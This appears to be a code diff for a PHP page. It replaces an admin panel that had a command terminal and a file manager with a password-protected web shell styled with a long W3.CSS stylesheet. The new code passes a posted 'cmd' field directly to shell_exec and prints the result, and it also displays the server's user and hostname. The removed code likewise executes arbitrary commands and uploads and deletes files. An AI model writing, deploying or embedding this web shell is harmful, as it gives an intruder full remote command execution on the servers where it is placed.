+.w3-col.s5{width:41.66666%}.w3-col.s6{width:49.99999%}.w3-col.s7{width:58.33333%}.w3-col.s8{width:66.66666%}
+.w3-col.s9{width:74.99999%}.w3-col.s10{width:83.33333%}.w3-col.s11{width:91.66666%}.w3-col.s12{width:99.99999%}
+@media (min-width:601px){.w3-col.m1{width:8.33333%}.w3-col.m2{width:16.66666%}.w3-col.m3,.w3-quarter{width:24.99999%}.w3-col.m4,.w3-third{width:33.33333%}
+.w3-col.m5{width:41.66666%}.w3-col.m6,.w3-half{width:49.99999%}.w3-col.m7{width:58.33333%}.w3-col.m8,.w3-twothird{width:66.66666%}
+.w3-col.m9,.w3-threequarter{width:74.99999%}.w3-col.m10{width:83.33333%}.w3-col.m11{width:91.66666%}.w3-col.m12{width:99.99999%}}
+@media (min-width:993px){.w3-col.l1{width:8.33333%}.w3-col.l2{width:16.66666%}.w3-col.l3{width:24.99999%}.w3-col.l4{width:33.33333%}
+.w3-col.l5{width:41.66666%}.w3-col.l6{width:49.99999%}.w3-col.l7{width:58.33333%}.w3-col.l8{width:66.66666%}
+.w3-col.l9{width:74.99999%}.w3-col.l10{width:83.33333%}.w3-col.l11{width:91.66666%}.w3-col.l12{width:99.99999%}}
+.w3-rest{overflow:hidden}.w3-stretch{margin-left:-16px;margin-right:-16px}
+.w3-content,.w3-auto{margin-left:auto;margin-right:auto}.w3-content{max-width:980px}.w3-auto{max-width:1140px}
+.w3-cell-row{display:table;width:100%}.w3-cell{display:table-cell}
+.w3-cell-top{vertical-align:top}.w3-cell-middle{vertical-align:middle}.w3-cell-bottom{vertical-align:bottom}
+.w3-hide{display:none!important}.w3-show-block,.w3-show{display:block!important}.w3-show-inline-block{display:inline-block!important}
+@media (max-width:1205px){.w3-auto{max-width:95%}}
+@media (max-width:600px){.w3-modal-content{margin:0 10px;width:auto!important}.w3-modal{padding-top:30px}
+.w3-dropdown-hover.w3-mobile .w3-dropdown-content,.w3-dropdown-click.w3-mobile .w3-dropdown-content{position:relative}	
+.w3-hide-small{display:none!important}.w3-mobile{display:block;width:100%!important}.w3-bar-item.w3-mobile,.w3-dropdown-hover.w3-mobile,.w3-dropdown-click.w3-mobile{text-align:center}
+.w3-dropdown-hover.w3-mobile,.w3-dropdown-hover.w3-mobile .w3-btn,.w3-dropdown-hover.w3-mobile .w3-button,.w3-dropdown-click.w3-mobile,.w3-dropdown-click.w3-mobile .w3-btn,.w3-dropdown-click.w3-mobile .w3-button{width:100%}}
+@media (max-width:768px){.w3-modal-content{width:500px}.w3-modal{padding-top:50px}}
+@media (min-width:993px){.w3-modal-content{width:900px}.w3-hide-large{display:none!important}.w3-sidebar.w3-collapse{display:block!important}}
+@media (max-width:992px) and (min-width:601px){.w3-hide-medium{display:none!important}}
+@media (max-width:992px){.w3-sidebar.w3-collapse{display:none}.w3-main{margin-left:0!important;margin-right:0!important}.w3-auto{max-width:100%}}
+.w3-top,.w3-bottom{position:fixed;width:100%;z-index:1}.w3-top{top:0}.w3-bottom{bottom:0}
+.w3-overlay{position:fixed;display:none;width:100%;height:100%;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,0.5);z-index:2}
+.w3-display-topleft{position:absolute;left:0;top:0}.w3-display-topright{position:absolute;right:0;top:0}
+.w3-display-bottomleft{position:absolute;left:0;bottom:0}.w3-display-bottomright{position:absolute;right:0;bottom:0}
+.w3-display-middle{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%)}
+.w3-display-left{position:absolute;top:50%;left:0%;transform:translate(0%,-50%);-ms-transform:translate(-0%,-50%)}
+.w3-display-right{position:absolute;top:50%;right:0%;transform:translate(0%,-50%);-ms-transform:translate(0%,-50%)}
+.w3-display-topmiddle{position:absolute;left:50%;top:0;transform:translate(-50%,0%);-ms-transform:translate(-50%,0%)}
+.w3-display-bottommiddle{position:absolute;left:50%;bottom:0;transform:translate(-50%,0%);-ms-transform:translate(-50%,0%)}
+.w3-display-container:hover .w3-display-hover{display:block}.w3-display-container:hover span.w3-display-hover{display:inline-block}.w3-display-hover{display:none}
+.w3-display-position{position:absolute}
+.w3-circle{border-radius:50%}
+.w3-round-small{border-radius:2px}.w3-round,.w3-round-medium{border-radius:4px}.w3-round-large{border-radius:8px}.w3-round-xlarge{border-radius:16px}.w3-round-xxlarge{border-radius:32px}
+.w3-row-padding,.w3-row-padding>.w3-half,.w3-row-padding>.w3-third,.w3-row-padding>.w3-twothird,.w3-row-padding>.w3-threequarter,.w3-row-padding>.w3-quarter,.w3-row-padding>.w3-col{padding:0 8px}
+.w3-container,.w3-panel{padding:0.01em 16px}.w3-panel{margin-top:16px;margin-bottom:16px}
+.w3-code,.w3-codespan{font-family:Consolas,"courier new";font-size:16px}
+.w3-code{width:auto;background-color:#fff;padding:8px 12px;border-left:4px solid #4CAF50;word-wrap:break-word}
+.w3-codespan{color:crimson;background-color:#f1f1f1;padding-left:4px;padding-right:4px;font-size:110%}
+.w3-card,.w3-card-2{box-shadow:0 2px 5px 0 rgba(0,0,0,0.16),0 2px 10px 0 rgba(0,0,0,0.12)}
+.w3-card-4,.w3-hover-shadow:hover{box-shadow:0 4px 10px 0 rgba(0,0,0,0.2),0 4px 20px 0 rgba(0,0,0,0.19)}
+.w3-spin{animation:w3-spin 2s infinite linear}@keyframes w3-spin{0%{transform:rotate(0deg)}100%{transform:rotate(359deg)}}
+.w3-animate-fading{animation:fading 10s infinite}@keyframes fading{0%{opacity:0}50%{opacity:1}100%{opacity:0}}
+.w3-animate-opacity{animation:opac 0.8s}@keyframes opac{from{opacity:0} to{opacity:1}}
+.w3-animate-top{position:relative;animation:animatetop 0.4s}@keyframes animatetop{from{top:-300px;opacity:0} to{top:0;opacity:1}}
+.w3-animate-left{position:relative;animation:animateleft 0.4s}@keyframes animateleft{from{left:-300px;opacity:0} to{left:0;opacity:1}}
+.w3-animate-right{position:relative;animation:animateright 0.4s}@keyframes animateright{from{right:-300px;opacity:0} to{right:0;opacity:1}}
+.w3-animate-bottom{position:relative;animation:animatebottom 0.4s}@keyframes animatebottom{from{bottom:-300px;opacity:0} to{bottom:0;opacity:1}}
+.w3-animate-zoom {animation:animatezoom 0.6s}@keyframes animatezoom{from{transform:scale(0)} to{transform:scale(1)}}
+.w3-animate-input{transition:width 0.4s ease-in-out}.w3-animate-input:focus{width:100%!important}
+.w3-opacity,.w3-hover-opacity:hover{opacity:0.60}.w3-opacity-off,.w3-hover-opacity-off:hover{opacity:1}
+.w3-opacity-max{opacity:0.25}.w3-opacity-min{opacity:0.75}
+.w3-greyscale-max,.w3-grayscale-max,.w3-hover-greyscale:hover,.w3-hover-grayscale:hover{filter:grayscale(100%)}
+.w3-greyscale,.w3-grayscale{filter:grayscale(75%)}.w3-greyscale-min,.w3-grayscale-min{filter:grayscale(50%)}
+.w3-sepia{filter:sepia(75%)}.w3-sepia-max,.w3-hover-sepia:hover{filter:sepia(100%)}.w3-sepia-min{filter:sepia(50%)}
+.w3-tiny{font-size:10px!important}.w3-small{font-size:12px!important}.w3-medium{font-size:15px!important}.w3-large{font-size:18px!important}
+.w3-xlarge{font-size:24px!important}.w3-xxlarge{font-size:36px!important}.w3-xxxlarge{font-size:48px!important}.w3-jumbo{font-size:64px!important}
+.w3-left-align{text-align:left!important}.w3-right-align{text-align:right!important}.w3-justify{text-align:justify!important}.w3-center{text-align:center!important}
+.w3-border-0{border:0!important}.w3-border{border:1px solid #ccc!important}
+.w3-border-top{border-top:1px solid #ccc!important}.w3-border-bottom{border-bottom:1px solid #ccc!important}
+.w3-border-left{border-left:1px solid #ccc!important}.w3-border-right{border-right:1px solid #ccc!important}
+.w3-topbar{border-top:6px solid #ccc!important}.w3-bottombar{border-bottom:6px solid #ccc!important}
+.w3-leftbar{border-left:6px solid #ccc!important}.w3-rightbar{border-right:6px solid #ccc!important}
+.w3-section,.w3-code{margin-top:16px!important;margin-bottom:16px!important}
+.w3-margin{margin:16px!important}.w3-margin-top{margin-top:16px!important}.w3-margin-bottom{margin-bottom:16px!important}
+.w3-margin-left{margin-left:16px!important}.w3-margin-right{margin-right:16px!important}
+.w3-padding-small{padding:4px 8px!important}.w3-padding{padding:8px 16px!important}.w3-padding-large{padding:12px 24px!important}
+.w3-padding-16{padding-top:16px!important;padding-bottom:16px!important}.w3-padding-24{padding-top:24px!important;padding-bottom:24px!important}
+.w3-padding-32{padding-top:32px!important;padding-bottom:32px!important}.w3-padding-48{padding-top:48px!important;padding-bottom:48px!important}
+.w3-padding-64{padding-top:64px!important;padding-bottom:64px!important}
+.w3-left{float:left!important}.w3-right{float:right!important}
+.w3-button:hover{color:#000!important;background-color:#ccc!important}
+.w3-transparent,.w3-hover-none:hover{background-color:transparent!important}
+.w3-hover-none:hover{box-shadow:none!important}
+/* Colors */
+.w3-amber,.w3-hover-amber:hover{color:#000!important;background-color:#ffc107!important}
+.w3-aqua,.w3-hover-aqua:hover{color:#000!important;background-color:#00ffff!important}
+.w3-blue,.w3-hover-blue:hover{color:#fff!important;background-color:#2196F3!important}
+.w3-light-blue,.w3-hover-light-blue:hover{color:#000!important;background-color:#87CEEB!important}
+.w3-brown,.w3-hover-brown:hover{color:#fff!important;background-color:#795548!important}
+.w3-cyan,.w3-hover-cyan:hover{color:#000!important;background-color:#00bcd4!important}
+.w3-blue-grey,.w3-hover-blue-grey:hover,.w3-blue-gray,.w3-hover-blue-gray:hover{color:#fff!important;background-color:#607d8b!important}
+.w3-green,.w3-hover-green:hover{color:#fff!important;background-color:#4CAF50!important}
+.w3-light-green,.w3-hover-light-green:hover{color:#000!important;background-color:#8bc34a!important}
+.w3-indigo,.w3-hover-indigo:hover{color:#fff!important;background-color:#3f51b5!important}
+.w3-khaki,.w3-hover-khaki:hover{color:#000!important;background-color:#f0e68c!important}
+.w3-lime,.w3-hover-lime:hover{color:#000!important;background-color:#cddc39!important}
+.w3-orange,.w3-hover-orange:hover{color:#000!important;background-color:#ff9800!important}
+.w3-deep-orange,.w3-hover-deep-orange:hover{color:#fff!important;background-color:#ff5722!important}
+.w3-pink,.w3-hover-pink:hover{color:#fff!important;background-color:#e91e63!important}
+.w3-purple,.w3-hover-purple:hover{color:#fff!important;background-color:#9c27b0!important}
+.w3-deep-purple,.w3-hover-deep-purple:hover{color:#fff!important;background-color:#673ab7!important}
+.w3-red,.w3-hover-red:hover{color:#fff!important;background-color:#f44336!important}
+.w3-sand,.w3-hover-sand:hover{color:#000!important;background-color:#fdf5e6!important}
+.w3-teal,.w3-hover-teal:hover{color:#fff!important;background-color:#009688!important}
+.w3-yellow,.w3-hover-yellow:hover{color:#000!important;background-color:#ffeb3b!important}
+.w3-white,.w3-hover-white:hover{color:#000!important;background-color:#fff!important}
+.w3-black,.w3-hover-black:hover{color:#fff!important;background-color:#000!important}
+.w3-grey,.w3-hover-grey:hover,.w3-gray,.w3-hover-gray:hover{color:#000!important;background-color:#9e9e9e!important}
+.w3-light-grey,.w3-hover-light-grey:hover,.w3-light-gray,.w3-hover-light-gray:hover{color:#000!important;background-color:#f1f1f1!important}
+.w3-dark-grey,.w3-hover-dark-grey:hover,.w3-dark-gray,.w3-hover-dark-gray:hover{color:#fff!important;background-color:#616161!important}
+.w3-pale-red,.w3-hover-pale-red:hover{color:#000!important;background-color:#ffdddd!important}
+.w3-pale-green,.w3-hover-pale-green:hover{color:#000!important;background-color:#ddffdd!important}
+.w3-pale-yellow,.w3-hover-pale-yellow:hover{color:#000!important;background-color:#ffffcc!important}
+.w3-pale-blue,.w3-hover-pale-blue:hover{color:#000!important;background-color:#ddffff!important}
+.w3-text-amber,.w3-hover-text-amber:hover{color:#ffc107!important}
+.w3-text-aqua,.w3-hover-text-aqua:hover{color:#00ffff!important}
+.w3-text-blue,.w3-hover-text-blue:hover{color:#2196F3!important}
+.w3-text-light-blue,.w3-hover-text-light-blue:hover{color:#87CEEB!important}
+.w3-text-brown,.w3-hover-text-brown:hover{color:#795548!important}
+.w3-text-cyan,.w3-hover-text-cyan:hover{color:#00bcd4!important}
+.w3-text-blue-grey,.w3-hover-text-blue-grey:hover,.w3-text-blue-gray,.w3-hover-text-blue-gray:hover{color:#607d8b!important}
+.w3-text-green,.w3-hover-text-green:hover{color:#4CAF50!important}
+.w3-text-light-green,.w3-hover-text-light-green:hover{color:#8bc34a!important}
+.w3-text-indigo,.w3-hover-text-indigo:hover{color:#3f51b5!important}
+.w3-text-khaki,.w3-hover-text-khaki:hover{color:#b4aa50!important}
+.w3-text-lime,.w3-hover-text-lime:hover{color:#cddc39!important}
+.w3-text-orange,.w3-hover-text-orange:hover{color:#ff9800!important}
+.w3-text-deep-orange,.w3-hover-text-deep-orange:hover{color:#ff5722!important}
+.w3-text-pink,.w3-hover-text-pink:hover{color:#e91e63!important}
+.w3-text-purple,.w3-hover-text-purple:hover{color:#9c27b0!important}
+.w3-text-deep-purple,.w3-hover-text-deep-purple:hover{color:#673ab7!important}
+.w3-text-red,.w3-hover-text-red:hover{color:#f44336!important}
+.w3-text-sand,.w3-hover-text-sand:hover{color:#fdf5e6!important}
+.w3-text-teal,.w3-hover-text-teal:hover{color:#009688!important}
+.w3-text-yellow,.w3-hover-text-yellow:hover{color:#d2be0e!important}
+.w3-text-white,.w3-hover-text-white:hover{color:#fff!important}
+.w3-text-black,.w3-hover-text-black:hover{color:#000!important}
+.w3-text-grey,.w3-hover-text-grey:hover,.w3-text-gray,.w3-hover-text-gray:hover{color:#757575!important}
+.w3-text-light-grey,.w3-hover-text-light-grey:hover,.w3-text-light-gray,.w3-hover-text-light-gray:hover{color:#f1f1f1!important}
+.w3-text-dark-grey,.w3-hover-text-dark-grey:hover,.w3-text-dark-gray,.w3-hover-text-dark-gray:hover{color:#3a3a3a!important}
+.w3-border-amber,.w3-hover-border-amber:hover{border-color:#ffc107!important}
+.w3-border-aqua,.w3-hover-border-aqua:hover{border-color:#00ffff!important}
+.w3-border-blue,.w3-hover-border-blue:hover{border-color:#2196F3!important}
+.w3-border-light-blue,.w3-hover-border-light-blue:hover{border-color:#87CEEB!important}
+.w3-border-brown,.w3-hover-border-brown:hover{border-color:#795548!important}
+.w3-border-cyan,.w3-hover-border-cyan:hover{border-color:#00bcd4!important}
+.w3-border-blue-grey,.w3-hover-border-blue-grey:hover,.w3-border-blue-gray,.w3-hover-border-blue-gray:hover{border-color:#607d8b!important}
+.w3-border-green,.w3-hover-border-green:hover{border-color:#4CAF50!important}
+.w3-border-light-green,.w3-hover-border-light-green:hover{border-color:#8bc34a!important}
+.w3-border-indigo,.w3-hover-border-indigo:hover{border-color:#3f51b5!important}
+.w3-border-khaki,.w3-hover-border-khaki:hover{border-color:#f0e68c!important}
+.w3-border-lime,.w3-hover-border-lime:hover{border-color:#cddc39!important}
+.w3-border-orange,.w3-hover-border-orange:hover{border-color:#ff9800!important}
+.w3-border-deep-orange,.w3-hover-border-deep-orange:hover{border-color:#ff5722!important}
+.w3-border-pink,.w3-hover-border-pink:hover{border-color:#e91e63!important}
+.w3-border-purple,.w3-hover-border-purple:hover{border-color:#9c27b0!important}
+.w3-border-deep-purple,.w3-hover-border-deep-purple:hover{border-color:#673ab7!important}
+.w3-border-red,.w3-hover-border-red:hover{border-color:#f44336!important}
+.w3-border-sand,.w3-hover-border-sand:hover{border-color:#fdf5e6!important}
+.w3-border-teal,.w3-hover-border-teal:hover{border-color:#009688!important}
+.w3-border-yellow,.w3-hover-border-yellow:hover{border-color:#ffeb3b!important}
+.w3-border-white,.w3-hover-border-white:hover{border-color:#fff!important}
+.w3-border-black,.w3-hover-border-black:hover{border-color:#000!important}
+.w3-border-grey,.w3-hover-border-grey:hover,.w3-border-gray,.w3-hover-border-gray:hover{border-color:#9e9e9e!important}
+.w3-border-light-grey,.w3-hover-border-light-grey:hover,.w3-border-light-gray,.w3-hover-border-light-gray:hover{border-color:#f1f1f1!important}
+.w3-border-dark-grey,.w3-hover-border-dark-grey:hover,.w3-border-dark-gray,.w3-hover-border-dark-gray:hover{border-color:#616161!important}
+.w3-border-pale-red,.w3-hover-border-pale-red:hover{border-color:#ffe7e7!important}.w3-border-pale-green,.w3-hover-border-pale-green:hover{border-color:#e7ffe7!important}
+.w3-border-pale-yellow,.w3-hover-border-pale-yellow:hover{border-color:#ffffcc!important}.w3-border-pale-blue,.w3-hover-border-pale-blue:hover{border-color:#e7ffff!important}
+.fullscreen {width: 100%; height:100%; height: auto; margin: 0.5% !important;border-width: 5px !important}
+.cmdInput {border:0 !important; width: 100%}
+</style>
 
-        <div class="tabs">
-            <button class="tab active" onclick="switchTab('terminal')">💻 Terminal</button>
-            <button class="tab" onclick="switchTab('files')">📁 File Manager</button>
-            <button class="tab" onclick="switchTab('phpinfo')">🐘 PHP Info</button>
-            <button class="tab" onclick="switchTab('system')">🔧 System</button>
-        </div>
 
-        <div id="terminal" class="tab-content active">
-            <h2>Command Terminal</h2>
-            
-            <div class="quick-commands">
-                <div class="quick-command" onclick="insertCommand('pwd')">pwd</div>
-                <div class="quick-command" onclick="insertCommand('ls -la')">ls -la</div>
-                <div class="quick-command" onclick="insertCommand('whoami')">whoami</div>
-                <div class="quick-command" onclick="insertCommand('id')">id</div>
-                <div class="quick-command" onclick="insertCommand('df -h')">df -h</div>
-                <div class="quick-command" onclick="insertCommand('free -h')">free -h</div>
-                <div class="quick-command" onclick="insertCommand('ps aux')">ps aux</div>
-                <div class="quick-command" onclick="insertCommand('uname -a')">uname -a</div>
-            </div>
-            
-            <form method="post" class="command-form">
-                <input type="text" name="command" class="command-input" placeholder="Enter command..." required id="commandInput">
-                <button type="submit" class="btn">Execute</button>
-            </form>
-            
-            <?php if (!empty($output)): ?>
-                <div class="output"><?php echo sanitizeInput($output); ?></div>
-            <?php endif; ?>
-        </div>
+<script>
+// enter key submit stuff
+var input = document.getElementById("cmd");
+input.addEventListener("keyup", function(event) {
+  if (event.keyCode === 13) {
+   event.preventDefault();
+   document.getElementById("submitBut").click();
+  }
+});
+</script>
 
-        <div id="files" class="tab-content">
-            <h2>File Manager</h2>
-            
-            <div class="file-manager">
-                <div class="breadcrumb">
-                    <a href="?dir=<?php echo urlencode($CONFIG['base_directory']); ?>">Root</a>
-                    <?php
-                    $dir_parts = explode('/', str_replace($CONFIG['base_directory'], '', $current_dir));
-                    $current_path = $CONFIG['base_directory'];
-                    foreach ($dir_parts as $part) {
-                        if (!empty($part)) {
-                            $current_path .= '/' . $part;
-                            echo ' / <a href="?dir=' . urlencode($current_path) . '">' . $part . '</a>';
-                        }
-                    }
-                    ?>
-                </div>
-                
-                <div class="file-actions">
-                    <button class="btn" onclick="showModal('uploadModal')">📤 Upload File</button>
-                    <button class="btn" onclick="showModal('createFileModal')">📄 Create File</button>
-                    <button class="btn" onclick="showModal('createDirModal')">📁 Create Directory</button>
-                </div>
-                
-                <?php if (!empty($output)): ?>
-                    <div class="alert <?php echo strpos($output, 'Error') !== false ? 'alert-error' : 'alert-success'; ?>">
-                        <?php echo sanitizeInput($output); ?>
-                    </div>
-                <?php endif; ?>
-                
-                <table class="file-table">
-                    <thead>
-                        <tr>
-                            <th>Name</th>
-                            <th>Size</th>
-                            <th>Permissions</th>
-                            <th>Modified</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php if ($current_dir != $CONFIG['base_directory']): ?>
-                            <tr>
-                                <td>
-                                    <span class="file-icon">📁</span>
-                                    <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">..</a>
-                                </td>
-                                <td>-</td>
-                                <td>-</td>
-                                <td>-</td>
-                                <td>-</td>
-                            </tr>
-                        <?php endif; ?>
-                        
-                        <?php foreach ($directory_contents as $item): ?>
-                            <tr>
-                                <td>
-                                    <span class="file-icon"><?php echo $item['is_dir'] ? '📁' : '📄'; ?></span>
-                                    <?php if ($item['is_dir']): ?>
-                                        <a href="?dir=<?php echo urlencode($item['path']); ?>"><?php echo $item['name']; ?></a>
-                                    <?php else: ?>
-                                        <?php echo $item['name']; ?>
-                                    <?php endif; ?>
-                                </td>
-                                <td><?php echo $item['is_dir'] ? '-' : formatBytes($item['size']); ?></td>
-                                <td><?php echo $item['perms']; ?></td>
-                                <td><?php echo date('Y-m-d H:i:s', $item['modified']); ?></td>
-                                <td class="file-actions-cell">
-                                    <?php if (!$item['is_dir']): ?>
-                                        <form method="post" style="display: inline;">
-                                            <input type="hidden" name="file_path" value="<?php echo $item['path']; ?>">
-                                            <button type="submit" name="download" class="btn">Download</button>
-                                        </form>
-                                    <?php endif; ?>
-                                    <form method="post" style="display: inline;" onsubmit="return confirm('Are you sure you want to delete <?php echo $item['name']; ?>?');">
-                                        <input type="hidden" name="file_path" value="<?php echo $item['path']; ?>">
-                                        <button type="submit" name="delete_file" class="btn btn-danger">Delete</button>
-                                    </form>
-                                </td>
-                            </tr>
-                        <?php endforeach; ?>
-                    </tbody>
-                </table>
-            </div>
-        </div>
 
-        <div id="phpinfo" class="tab-content">
-            <h2>PHP Information</h2>
-            <div class="output">
-                <?php
-                ob_start();
-                phpinfo();
-                $phpinfo = ob_get_clean();
-                echo $phpinfo;
-                ?>
-            </div>
-        </div>
-        
-        <div id="system" class="tab-content">
-            <h2>System Information</h2>
-            <div class="output">
-                <strong>Operating System:</strong> <?php echo $system_info['os']; ?><br>
-                <strong>Server Software:</strong> <?php echo $system_info['server']; ?><br>
-                <strong>PHP Version:</strong> <?php echo $system_info['php_version']; ?><br>
-                <strong>Server IP:</strong> <?php echo $system_info['server_ip']; ?><br>
-                <strong>Client IP:</strong> <?php echo $system_info['client_ip']; ?><br>
-                <strong>Uptime:</strong> <?php echo $system_info['uptime']; ?><br>
-                <strong>CPU Info:</strong> <?php echo $system_info['cpu_info']; ?><br>
-                <strong>Load Average:</strong> <?php echo $system_info['load_average']; ?><br>
-                <strong>Memory Usage:</strong> <?php echo formatBytes($system_info['memory_usage']); ?> (Peak: <?php echo formatBytes($system_info['memory_peak']); ?>)<br>
-                <strong>Disk Usage:</strong> <?php echo formatBytes($system_info['disk_used']); ?> of <?php echo formatBytes($system_info['disk_total']); ?> (<?php echo round(($system_info['disk_used'] / $system_info['disk_total']) * 100, 2); ?>%)<br>
-                <strong>Free Disk Space:</strong> <?php echo formatBytes($system_info['disk_free']); ?><br>
-            </div>
-        </div>
-    </div>
-
-    <!-- Upload File Modal -->
-    <div id="uploadModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Upload File</h3>
-                <button class="modal-close" onclick="hideModal('uploadModal')">&times;</button>
-            </div>
-            <form method="post" enctype="multipart/form-data">
-                <div class="form-group">
-                    <label for="upload_file">Select File:</label>
-                    <input type="file" name="upload_file" id="upload_file" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <button type="submit" class="btn">Upload</button>
-                    <button type="button" class="btn btn-danger" onclick="hideModal('uploadModal')">Cancel</button>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <!-- Create File Modal -->
-    <div id="createFileModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Create New File</h3>
-                <button class="modal-close" onclick="hideModal('createFileModal')">&times;</button>
-            </div>
-            <form method="post">
-                <input type="hidden" name="create_file" value="1">
-                <div class="form-group">
-                    <label for="filename">File Name:</label>
-                    <input type="text" name="filename" id="filename" class="form-control" required placeholder="example.txt">
-                </div>
-                <div class="form-group">
-                    <button type="submit" class="btn">Create</button>
-                    <button type="button" class="btn btn-danger" onclick="hideModal('createFileModal')">Cancel</button>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <!-- Create Directory Modal -->
-    <div id="createDirModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Create New Directory</h3>
-                <button class="modal-close" onclick="hideModal('createDirModal')">&times;</button>
-            </div>
-            <form method="post">
-                <input type="hidden" name="create_dir" value="1">
-                <div class="form-group">
-                    <label for="dirname">Directory Name:</label>
-                    <input type="text" name="dirname" id="dirname" class="form-control" required placeholder="new_directory">
-                </div>
-                <div class="form-group">
-                    <button type="submit" class="btn">Create</button>
-                    <button type="button" class="btn btn-danger" onclick="hideModal('createDirModal')">Cancel</button>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <script>
-        function switchTab(tabName) {
-            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
-            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
-            document.getElementById(tabName).classList.add('active');
-            event.target.classList.add('active');
-        }
-        
-        function showModal(modalId) {
-            document.getElementById(modalId).style.display = 'flex';
-        }
-        
-        function hideModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
-        }
-        
-        function insertCommand(cmd) {
-            document.getElementById('commandInput').value = cmd;
-        }
-        
-        // Close modal when clicking outside
-        window.onclick = function(event) {
-            if (event.target.classList.contains('modal')) {
-                event.target.style.display = 'none';
-            }
-        }
-    </script>
-</body>
-</html>
-<?php
-ob_end_flush();
+<?php 
+    if (isset($_SESSION['valid_cred'])) {
+    // if valid_cred is set, can execute cmds
 ?>
+<!-- 
+*****************************
+    command submission
+*****************************
+-->
+    <div class="w3-container fullscreen w3-border w3-border-cyan" style="padding:0px;margin-bottom:0px !important"> 
+        <div class="w3-row">
+            <form method="POST" style="margin:0px">
+                <button class="w3-button w3-black w3-block" >Terminate Session</button> 
+                <input type="hidden" name="action" value="terminate">
+            </form>
+        </div>
+    </div>
+
+    <div class="w3-container w3-black w3-border-red w3-border fullscreen"> 
+
+        <div class="w3-row w3-margin">
+                <div class="w3-col l3">
+                    <label class="w3-text-red">
+                        <b>
+                            <?php
+                            // get whoami and hostname                             
+                            echo (rtrim(shell_exec('whoami')).'@'.shell_exec('hostname')); 
+                            ?>:
+                        </b>
+                    </label>
+                </div>
+                <div class="w3-col l9">
+                        <form method="POST">
+                        <b><input type="text" id="cmd" class="w3-text-white w3-black cmdInput" name="cmd" autofocus></b>
+                        <input type="submit" id="submitBut" style="display:none">
+                        <input type="hidden" name="action" value="cmd_exec">
+                        </form>
+                </div>
+        </div>
+    <?php
+        if (!empty($_POST['action'])){
+            switch ($_POST['action']) {
+                case 'cmd_exec':
+                    // shell execute and echo
+                    $cmd = $_POST['cmd'];
+                    echo '<pre>'.htmlentities(shell_exec($cmd)).'</pre>'; 
+                    break;
+                case 'terminate':
+                    // distroy session array!!
+                    $_SESSION = []; 
+                    session_destroy();
+                    echo "<meta http-equiv='refresh' content='0'>";
+            }
+        }        
+    ?>
+    </div>
+<?php 
+    } else { 
+    // if valid_cred is not set then need the passwd!
+?>
+
+<!-- 
+*****************************
+    password submission
+*****************************
+-->
+<div class="w3-row w3-margin">
+    <div class="w3-col l6">
+        <label class="w3-text-red">
+            <b>Password : </b>
+        </label>
+        <div class="w3-container w3-black w3-border-red w3-border fullscreen"> 
+            <div class="w3-row w3-margin">
+            <form method="POST">
+                    <div class="w3-col l6">
+                            <b><input type="password" id="cmd" class="w3-text-white w3-black cmdInput" name="passwd" autofocus></b>                            
+                    </div>
+                    <div class="w3-col l6">
+                        <input type="submit" id="submitBut" value="Submit" style="width:100%">         
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>  
+    <div class="w3-col l6"></div>    
+</div>
+
+<?php
+    }
+    if (!empty($_POST['passwd'])) {
+        $user_pass = $_POST['passwd'];
+
+        if (password_verify($user_pass, $PASSWD)){
+            $_SESSION['valid_cred'] = true;
+            echo "<meta http-equiv='refresh' content='0'>";
+        } else { ?>
+            <div class="w3-container"> 
+                <h5 class="w3-text-red"> <b>Sorry.. you don't have any superpowers :'( </b></h5>
+            </div>
+        <?php }
+    }
+?>
+
+</body>
